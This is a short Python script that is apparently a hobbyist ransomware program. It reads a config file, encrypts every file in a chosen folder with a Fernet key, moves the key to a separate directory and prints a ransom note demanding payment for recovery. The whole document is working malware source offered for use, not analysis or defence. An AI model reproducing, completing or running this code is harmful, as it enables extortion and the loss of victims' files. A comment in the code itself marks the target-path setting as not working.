import configparser
import os
from cryptography.fernet import Fernet
from tkinter import *
config = configparser.ConfigParser()

# Locating config.ini
dir = os.path.dirname(os.path.abspath(__file__))
config_file = f'{dir}\config.ini'

config.read(config_file)

MAIN = config['MAIN']

payment_note =     config.get('MAIN', 'payment_note')
path_to_encrypt =  config.get('MAIN', 'path_to_encrypt') # DONT WORK ---------------------------------------------------------------------------------------
ftp_path =         config.get('MAIN', 'ftp_path')



# ------


os.chdir(path_to_encrypt)
dir = os.getcwd()
key_location = "C:\Key_location"
the_key = f"{key_location}\key.key"




files = []

for file in os.listdir():
    
    if os.path.isfile(file):
        files.append(file)
        
key = Fernet.generate_key()

with open(files[0], "r") as content:
    if content.read().startswith("gAA"):
        print("Files are already encrypted!")
        quit()


with open("key.key", "wb") as myKey:
    myKey.write(key)
    
for file in files:
    with open(file, "rb") as cur_file:
        contents = cur_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as cur_file:
        cur_file.write(contents_encrypted)   
 
try:   
    os.replace(f"{dir}\key.key", f"{key_location}\key.key")
except Exception:
    os.mkdir(f"{key_location}")
    os.replace(f"{dir}\key.key", f"{key_location}\key.key")

print(f"Your files just got encrypted!")

print(f"The only way to get them back is to send me {payment_note}")
print(f"Whatever you do, do NOT delete any file named 'key.key' as this is the key to get your files back")

print(f"When I have recived {payment_note} I will send you a way to get your files back")



input()
